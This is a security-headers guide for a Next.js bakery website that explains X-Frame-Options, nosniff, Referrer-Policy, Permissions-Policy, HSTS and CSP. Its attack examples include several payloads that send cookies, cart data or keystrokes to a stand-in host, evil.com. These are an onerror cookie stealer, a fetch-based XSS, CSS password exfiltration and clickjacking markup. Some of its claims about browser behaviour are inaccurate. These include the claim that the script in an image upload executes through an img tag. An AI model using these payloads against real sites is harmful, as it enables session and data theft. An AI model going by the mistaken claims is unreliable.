# 🔒 Security Headers Guide - Next.js Configuration

This document explains each security header configured in `next.config.ts` and why they're essential for protecting your website.

---

## Table of Contents

1. [X-Frame-Options](#1-x-frame-options)
2. [X-Content-Type-Options](#2-x-content-type-options)
3. [Referrer-Policy](#3-referrer-policy)
4. [Permissions-Policy](#4-permissions-policy)
5. [Strict-Transport-Security (HSTS)](#5-strict-transport-security-hsts)
6. [Content-Security-Policy (CSP)](#6-content-security-policy-csp)

---

## 1. X-Frame-Options

### Configuration
```typescript
{
  key: 'X-Frame-Options',
  value: 'DENY',
}
```

### What It Does
Prevents your website from being embedded in an `<iframe>`, `<frame>`, `<embed>`, or `<object>` tag on other websites.

### Why We Use `DENY`
- **DENY**: No website (including your own) can embed your pages
- **SAMEORIGIN**: Only your own website can embed your pages
- **ALLOW-FROM**: Specific URLs can embed (deprecated)

**We chose DENY** because the Hzel Brown website doesn't need to be embedded anywhere, providing maximum protection.

### Attack It Prevents: **Clickjacking**

#### Real-World Attack Scenario:
```html
<!-- Attacker's malicious website: evil.com -->
<iframe src="https://hzel-brown.com/cart"
        style="opacity: 0; position: absolute; top: 0;">
</iframe>

<button style="position: absolute; top: 100px;">
  Click here to win a free brownie! 🍫
</button>
```

**What Happens:**
1. User visits `evil.com`
2. Your cart page is loaded invisibly in background
3. User thinks they're clicking "win free brownie" button
4. Actually clicking "Place Order" on your hidden cart
5. **Result**: Unauthorized purchases!

**With X-Frame-Options: DENY:**
```
❌ Browser blocks the iframe entirely
✅ Your site cannot be loaded in evil.com's iframe
✅ Attack prevented!
```

### Browser Behavior
```javascript
// Without X-Frame-Options
<iframe src="hzel-brown.com"> ✅ Loads successfully

// With X-Frame-Options: DENY
<iframe src="hzel-brown.com"> ❌ Refused to display
Console: "Refused to display 'https://hzel-brown.com/' in a frame because it set 'X-Frame-Options' to 'deny'."
```

---

## 2. X-Content-Type-Options

### Configuration
```typescript
{
  key: 'X-Content-Type-Options',
  value: 'nosniff',
}
```

### What It Does
Prevents browsers from "guessing" file types. Forces browsers to use the exact content type specified by the server.

### Why We Use `nosniff`
Without this header, browsers perform "MIME sniffing" - they ignore the server's `Content-Type` and guess based on file content. This can be exploited!

### Attack It Prevents: **MIME Confusion / XSS via File Upload**

#### Real-World Attack Scenario:

**Step 1: Attacker uploads "innocent" image**
```javascript
// File: innocent.jpg (actually contains JavaScript!)
GIF89a<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie);
</script>
```

**Step 2: Server incorrectly serves it**
```http
Content-Type: image/jpeg  👈 Server says it's an image
```

**Step 3: Without `nosniff`, browser "helps"**
```javascript
// Browser thinks: "This doesn't look like a JPEG...
// Let me check the content... oh! It's JavaScript!"
// Browser executes the script! 💀
```

**Step 4: User visits the "image"**
```html
<img src="/uploads/innocent.jpg">
<!-- Browser executes JavaScript instead of showing image! -->
```

**With X-Content-Type-Options: nosniff:**
```javascript
// Browser: "Server said image/jpeg, content looks like JavaScript"
// Browser: "With nosniff, I MUST respect the Content-Type"
// Browser: "This is broken, I'll show broken image icon instead"
❌ Script NOT executed
✅ XSS attack prevented!
```

### Before vs After Example

**Without nosniff:**
```http
Response Headers:
  Content-Type: text/plain

Browser Behavior:
  File contains: <html><script>alert('XSS')</script></html>
  Browser thinks: "This looks like HTML, I'll render it!"
  Result: ⚠️ XSS executed
```

**With nosniff:**
```http
Response Headers:
  Content-Type: text/plain
  X-Content-Type-Options: nosniff

Browser Behavior:
  File contains: <html><script>alert('XSS')</script></html>
  Browser thinks: "Content-Type says text/plain, nosniff says trust it"
  Result: ✅ Displays as plain text, no script execution
```

---

## 3. Referrer-Policy

### Configuration
```typescript
{
  key: 'Referrer-Policy',
  value: 'strict-origin-when-cross-origin',
}
```

### What It Does
Controls how much referrer information is sent when users navigate from your site to other sites.

### Policy Options Explained

| Policy | HTTPS → HTTPS | HTTPS → HTTP | What's Sent |
|--------|---------------|--------------|-------------|
| `no-referrer` | Nothing | Nothing | Nothing |
| `origin` | `https://hzel-brown.com` | `https://hzel-brown.com` | Origin only |
| `strict-origin` | `https://hzel-brown.com` | Nothing | Origin, no downgrade |
| **`strict-origin-when-cross-origin`** | Full URL (same-origin)<br>Origin only (cross-origin) | Nothing | **Balanced** ✅ |

### Why We Use `strict-origin-when-cross-origin`

**Best balance** of privacy and functionality:
- ✅ Full URL sent to your own pages (analytics work)
- ✅ Only origin sent to external sites (privacy protected)
- ✅ Nothing sent on HTTPS → HTTP (security maintained)

### Real-World Example

**User Journey:**
```
1. User on: https://hzel-brown.com/menu/brownies?sort=price
2. User clicks Instagram link in footer
3. Goes to: https://instagram.com/hzelbrownbakery
```

**Without Referrer Policy (default):**
```http
Referer: https://hzel-brown.com/menu/brownies?sort=price

⚠️ Instagram now knows:
  - User was on your site
  - Exact page they were viewing
  - Query parameters (could contain sensitive data)
```

**With `strict-origin-when-cross-origin`:**
```http
Referer: https://hzel-brown.com

✅ Instagram only knows:
  - User came from your site (origin)
  - NOT the specific page
  - NOT any query parameters
```

### Privacy Protection Example

**Scenario: User journey with sensitive data**
```
User visits: https://hzel-brown.com/cart?promoCode=SECRET123&userId=42
Clicks external link to shipping partner
```

**Without policy:**
```http
❌ Referer: https://hzel-brown.com/cart?promoCode=SECRET123&userId=42
   (Leaked: promo code, user ID!)
```

**With strict-origin-when-cross-origin:**
```http
✅ Referer: https://hzel-brown.com
   (Protected: no sensitive parameters leaked!)
```

---

## 4. Permissions-Policy

### Configuration
```typescript
{
  key: 'Permissions-Policy',
  value: 'camera=(), microphone=(), geolocation=()',
}
```

### What It Does
Controls which browser features and APIs can be used on your website.

### Why We Disable These Features

**Hzel Brown is an e-commerce bakery website - we don't need:**
- 📷 **Camera** - No video calls, no photo uploads
- 🎤 **Microphone** - No voice features, no audio recording
- 📍 **Geolocation** - We deliver to Tamil Nadu (stated on site), no live location needed

### Attack It Prevents: **Unauthorized Feature Access**

#### Real-World Attack Scenario:

**Malicious Third-Party Script:**
```javascript
// External analytics script gets compromised
// Attacker injects malicious code:

(function() {
  // Try to access camera
  navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
      // Record user's webcam
      // Send video to evil.com
      fetch('https://evil.com/spy', {
        method: 'POST',
        body: stream
      });
    });

  // Try to get location
  navigator.geolocation.getCurrentPosition(pos => {
    // Track user's physical location
    // Send to evil.com
    fetch('https://evil.com/track', {
      method: 'POST',
      body: JSON.stringify(pos)
    });
  });
})();
```

**Without Permissions-Policy:**
```javascript
// Browser prompts user:
"hzel-brown.com wants to access your camera"
[Block] [Allow]

⚠️ User might accidentally click Allow
⚠️ Malicious script gets access!
```

**With Permissions-Policy:**
```javascript
// Browser immediately blocks:
SecurityError: The 'camera' feature is not enabled in this document.

✅ No prompt shown to user
✅ Feature completely disabled
✅ Even if malicious script tries, it fails silently
```

### Feature Control Examples

**Other useful features to control:**

```typescript
// Full example with more features
'camera=(), microphone=(), geolocation=(), payment=(), usb=(), magnetometer=(), gyroscope=()'

// Allow features only for your domain
'camera=(self), microphone=(self)'  // Only your site can use

// Allow for specific trusted domains
'payment=(self "https://stripe.com")'  // You + Stripe can use payment API
```

### Browser Console Demonstration

**Before Permissions-Policy:**
```javascript
navigator.geolocation.getCurrentPosition(
  success => console.log('Location:', success),
  error => console.log('Error:', error)
);
// Result: Browser prompts user for permission
```

**After Permissions-Policy:**
```javascript
navigator.geolocation.getCurrentPosition(
  success => console.log('Location:', success),
  error => console.log('Error:', error)
);
// Result: Immediately fails
// Error: NotAllowedError: The request is not allowed by Permissions Policy
```

---

## 5. Strict-Transport-Security (HSTS)

### Configuration
```typescript
{
  key: 'Strict-Transport-Security',
  value: 'max-age=63072000; includeSubDomains; preload',
}
```

### What It Does
Forces browsers to ONLY connect via HTTPS, never HTTP, for the specified duration.

### Configuration Breakdown

```typescript
max-age=63072000        // 2 years (in seconds)
includeSubDomains       // Apply to all subdomains (blog.hzel-brown.com, etc.)
preload                 // Request inclusion in browser HSTS preload list
```

| Directive | Value | Meaning |
|-----------|-------|---------|
| `max-age` | `63072000` | Remember this rule for **2 years** |
| `includeSubDomains` | (flag) | Also protect `*.hzel-brown.com` |
| `preload` | (flag) | Add to Chrome/Firefox/Safari built-in list |

### Attack It Prevents: **SSL Stripping / Man-in-the-Middle**

#### Real-World Attack Scenario:

**Victim on Public WiFi at cafe:**

**Step 1: User types URL (no https://)**
```
User types: hzel-brown.com
Browser tries: http://hzel-brown.com (insecure!)
```

**Step 2: Attacker intercepts (SSL Stripping)**
```
☕ Cafe WiFi (compromised)
     ↓
🎭 Attacker's device
   - Intercepts HTTP request
   - Connects to real site via HTTPS
   - Proxies content back via HTTP
     ↓
💻 Victim's browser
   - Thinks it's connected to real site
   - Sees correct content
   - But connection is HTTP (unencrypted)!
```

**Step 3: Data theft**
```javascript
// User enters credit card on "secure" looking checkout
// Attacker sees EVERYTHING in plain text:
{
  cardNumber: "1234-5678-9012-3456",
  cvv: "123",
  email: "user@example.com",
  password: "MyPassword123"
}
```

**With HSTS Enabled:**

```
First Visit (after HTTPS):
  ↓
Browser receives HSTS header
  ↓
Browser stores: "ALWAYS use HTTPS for hzel-brown.com for 2 years"
  ↓
Future Visits:
  User types: hzel-brown.com
  Browser thinks: "My HSTS cache says ALWAYS HTTPS"
  Browser AUTOMATICALLY changes to: https://hzel-brown.com
  ↓
✅ Attacker's HTTP interception fails!
✅ Browser refuses to connect via HTTP
✅ User protected!
```

### Timeline Example

**Day 1: User first visits**
```http
Request: https://hzel-brown.com
Response Headers:
  Strict-Transport-Security: max-age=63072000; includeSubDomains; preload

Browser saves: "HTTPS ONLY for hzel-brown.com until 2027"
```

**Day 365: User visits again (on public WiFi)**
```
User types: hzel-brown.com
Attacker tries: Redirect to http://hzel-brown.com
Browser: "NO! My HSTS cache says HTTPS only!"
Browser auto-upgrades: https://hzel-brown.com
✅ Attack blocked
```

**Year 2027: HSTS expires**
```
Browser: "HSTS expired, need to refresh policy"
Visits: https://hzel-brown.com
Gets new HSTS header
✅ Protection renewed for another 2 years
```

### HSTS Preload List

**What is it?**
- Built-in list in Chrome, Firefox, Safari, Edge
- Sites hardcoded to ALWAYS use HTTPS
- Protection works even on FIRST visit (before HSTS header received)

**How to get on the list:**
1. Set HSTS with `preload` flag ✅ (we did this)
2. Submit domain at: https://hstspreload.org
3. Wait for approval (~weeks)
4. Browser updates include your domain

**Benefits:**
```
Regular HSTS:
  First visit: ⚠️ Vulnerable (no HSTS cache yet)
  Future visits: ✅ Protected

Preloaded HSTS:
  First visit: ✅ Protected (built into browser)
  All visits: ✅ Protected
```

---

## 6. Content-Security-Policy (CSP)

### Configuration
```typescript
{
  key: 'Content-Security-Policy',
  value: "default-src 'self'; " +
         "script-src 'self' 'unsafe-eval' 'unsafe-inline'; " +
         "style-src 'self' 'unsafe-inline'; " +
         "img-src 'self' data: https://cdn.sanity.io; " +
         "font-src 'self' data:; " +
         "connect-src 'self' https://cdn.sanity.io https://*.sanity.io;",
}
```

### What It Does
Controls which resources (scripts, styles, images, etc.) can be loaded and from where. Most powerful XSS protection!

### Directive Breakdown

Let's break down each part of our CSP:

#### 1. `default-src 'self'`
**Default policy for everything**

```
Meaning: By default, only load resources from your own domain
Applies to: Anything not explicitly configured below
```

Example:
```html
✅ <audio src="/sounds/beep.mp3">     (same origin)
❌ <audio src="https://evil.com/sounds/malware.mp3">  (blocked)
```

---

#### 2. `script-src 'self' 'unsafe-eval' 'unsafe-inline'`
**Where JavaScript can come from**

```
'self'           → Allow scripts from hzel-brown.com
'unsafe-eval'    → Allow eval(), setTimeout(string), Function()
'unsafe-inline'  → Allow <script> tags and inline event handlers
```

**Why we need these:**
- `'self'` - Your app's JavaScript files
- `'unsafe-eval'` - Next.js uses eval in development
- `'unsafe-inline'` - React inline event handlers, styled-components

**Security Trade-off:**
```javascript
// With 'unsafe-inline':
✅ <button onClick={() => handleClick()}>  // Works

// Ideal strict CSP (no unsafe-inline):
❌ <button onClick={() => handleClick()}>  // Blocked
✅ <button id="btn">  // Use event listeners instead
   <script src="/app.js">
     document.getElementById('btn').addEventListener('click', handleClick);
   </script>
```

**Attack Example Blocked by script-src:**

```html
<!-- Attacker injects via XSS -->
<img src="x" onerror="
  fetch('https://evil.com/steal?data=' + document.cookie)
">
```

**Without CSP:**
```
✅ Script executes
✅ Cookies sent to evil.com
⚠️ User compromised
```

**With our CSP:**
```
❌ inline script blocked (even though 'unsafe-inline' is set)
   because external domain (evil.com) not in connect-src
❌ fetch to evil.com blocked
✅ User protected
```

---

#### 3. `style-src 'self' 'unsafe-inline'`
**Where CSS can come from**

```
'self'           → Stylesheets from hzel-brown.com
'unsafe-inline'  → Inline <style> tags and style="" attributes
```

**Why we need unsafe-inline:**
- Tailwind CSS uses inline styles
- CSS-in-JS libraries (styled-components, emotion)
- Next.js injects critical CSS inline

Example:
```html
✅ <link rel="stylesheet" href="/styles.css">  ('self')
✅ <div style="color: red;">  ('unsafe-inline')
✅ <style>.box { padding: 10px; }</style>  ('unsafe-inline')
❌ <link rel="stylesheet" href="https://evil.com/steal-data.css">  (blocked)
```

**Attack Prevented:**
```html
<!-- Attacker tries to inject malicious CSS -->
<link rel="stylesheet" href="https://evil.com/malicious.css">
```

```css
/* malicious.css - Data exfiltration via CSS */
input[type="password"][value^="a"] {
  background: url('https://evil.com/steal?char=a');
}
input[type="password"][value^="b"] {
  background: url('https://evil.com/steal?char=b');
}
/* Steals password character by character! */
```

**With CSP:** ❌ External stylesheet blocked!

---

#### 4. `img-src 'self' data: https://cdn.sanity.io`
**Where images can load from**

```
'self'                    → Images from hzel-brown.com
data:                     → Base64 embedded images (data:image/png;base64,...)
https://cdn.sanity.io     → Your CMS image CDN
```

**Why this configuration:**
- `'self'` - Local images (icons, logos in /public)
- `data:` - Inline SVGs, base64 images
- `https://cdn.sanity.io` - Product images from Sanity CMS

Example:
```html
✅ <img src="/logo.png">  ('self')
✅ <img src="data:image/png;base64,iVBORw0KG...">  (data:)
✅ <img src="https://cdn.sanity.io/images/abc123/brownie.jpg">  (allowed CDN)
❌ <img src="https://evil.com/tracking-pixel.gif">  (blocked)
```

**Attack Prevented:**

```html
<!-- Attacker injects tracking pixel -->
<img src="https://evil.com/track?user=john&page=cart&total=500"
     width="1" height="1">
```

**Without CSP:** Image loads → evil.com gets user data

**With CSP:** ❌ Image blocked → no tracking!

---

#### 5. `font-src 'self' data:`
**Where fonts can load from**

```
'self'  → Fonts from hzel-brown.com
data:   → Base64 embedded fonts
```

Example:
```css
/* ✅ Allowed */
@font-face {
  font-family: 'MyFont';
  src: url('/fonts/myfont.woff2');  /* 'self' */
}

/* ✅ Allowed */
@font-face {
  font-family: 'InlineFont';
  src: url('data:font/woff2;base64,d09GMg...');  /* data: */
}

/* ❌ Blocked */
@font-face {
  font-family: 'GoogleFont';
  src: url('https://fonts.googleapis.com/font.woff2');  /* Not in font-src */
}
```

**Why self-hosted fonts:**
- ✅ Privacy - No third-party tracking
- ✅ Performance - Fonts cached on your domain
- ✅ Security - Control over font files

---

#### 6. `connect-src 'self' https://cdn.sanity.io https://*.sanity.io`
**Where AJAX/fetch/WebSocket can connect**

```
'self'                   → API calls to hzel-brown.com
https://cdn.sanity.io    → Sanity CDN
https://*.sanity.io      → All Sanity subdomains (api.sanity.io, etc.)
```

**Why we need Sanity domains:**
- Fetch product data from Sanity API
- Load images from Sanity CDN
- Real-time updates from Sanity

Example:
```javascript
// ✅ Allowed
fetch('/api/cart')  // 'self'
fetch('https://cdn.sanity.io/images/xyz/product.jpg')  // cdn.sanity.io
fetch('https://api.sanity.io/v1/data/query')  // *.sanity.io

// ❌ Blocked
fetch('https://evil.com/steal-data')
fetch('https://analytics.google.com/track')  // Even Google Analytics blocked!
```

**Attack Prevented:**

```javascript
// Attacker injects malicious script
<script>
  // Try to exfiltrate user's cart data
  const cart = localStorage.getItem('cart');
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify({ cart, cookies: document.cookie })
  });
</script>
```

**Without CSP:** ✅ Request succeeds → data stolen

**With CSP:**
```
❌ Blocked by connect-src
Console: "Refused to connect to 'https://evil.com/steal' because it violates the Content-Security-Policy"
✅ Data protected!
```

---

### CSP in Action: Real XSS Attack

**Scenario: Attacker finds XSS vulnerability**

```html
<!-- Vulnerable search feature -->
<div id="search-results">
  Results for: <%= userInput %>
</div>
```

**Attacker crafts malicious URL:**
```
https://hzel-brown.com/search?q=<script>
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: document.cookie
  })
</script>
```

**Page renders with injected script:**
```html
<div id="search-results">
  Results for: <script>
    fetch('https://evil.com/steal', {
      method: 'POST',
      body: document.cookie
    })
  </script>
</div>
```

**Without CSP:**
```javascript
✅ Script executes
✅ Cookie sent to evil.com
⚠️ User session hijacked
```

**With our CSP:**
```javascript
Step 1: Browser parses script
Step 2: Checks connect-src for fetch destination
Step 3: evil.com not in connect-src whitelist
❌ fetch() blocked!
Console: "Refused to connect to 'https://evil.com' - CSP violation"
✅ Cookies safe!
✅ XSS impact minimized!
```

---

## 🎯 Summary: Defense in Depth

Our security headers work together as layers:

```
┌─────────────────────────────────────────┐
│  X-Frame-Options                         │  Prevents clickjacking
├─────────────────────────────────────────┤
│  X-Content-Type-Options                  │  Prevents MIME confusion
├─────────────────────────────────────────┤
│  Referrer-Policy                         │  Protects privacy
├─────────────────────────────────────────┤
│  Permissions-Policy                      │  Blocks unnecessary features
├─────────────────────────────────────────┤
│  Strict-Transport-Security               │  Forces HTTPS
├─────────────────────────────────────────┤
│  Content-Security-Policy                 │  Prevents XSS & data theft
└─────────────────────────────────────────┘
           🛡️ Multi-Layer Security 🛡️
```

### Attack Coverage Matrix

| Attack Type | Protected By | How |
|-------------|--------------|-----|
| Clickjacking | X-Frame-Options | Blocks iframe embedding |
| XSS via Upload | X-Content-Type-Options | Prevents MIME type confusion |
| Data Leakage | Referrer-Policy | Limits referrer info |
| Camera Spying | Permissions-Policy | Disables camera API |
| SSL Stripping | HSTS | Forces HTTPS only |
| Script Injection | CSP | Whitelists script sources |
| Data Exfiltration | CSP connect-src | Blocks unauthorized fetch() |
| CSS Attacks | CSP style-src | Controls stylesheet sources |
| Tracking Pixels | CSP img-src | Blocks external images |

---

## 🧪 Testing Your Headers

### Browser DevTools
```javascript
// Open DevTools → Network tab → Select any request → Headers
Response Headers:
  ✅ x-frame-options: DENY
  ✅ x-content-type-options: nosniff
  ✅ referrer-policy: strict-origin-when-cross-origin
  ✅ permissions-policy: camera=(), microphone=(), geolocation=()
  ✅ strict-transport-security: max-age=63072000; includeSubDomains; preload
  ✅ content-security-policy: default-src 'self'; script-src...
```

### Online Tools
- **securityheaders.com** - Grade your security headers
- **observatory.mozilla.org** - Mozilla's security scanner
- **csp-evaluator.withgoogle.com** - Validate your CSP

### Command Line
```bash
# Check headers
curl -I https://hzel-brown.com | grep -i "x-frame\|content-security\|strict-transport"

# Verbose output
curl -v https://hzel-brown.com 2>&1 | grep "< "
```

---

## 📚 Further Reading

- [OWASP Secure Headers Project](https://owasp.org/www-project-secure-headers/)
- [MDN Web Security Guide](https://developer.mozilla.org/en-US/docs/Web/Security)
- [Content Security Policy Reference](https://content-security-policy.com/)
- [HSTS Preload List Submission](https://hstspreload.org/)

---

**Last Updated:** 2025-11-11
**Applies To:** Hzel Brown E-commerce Website
**Configuration File:** `/next.config.ts`
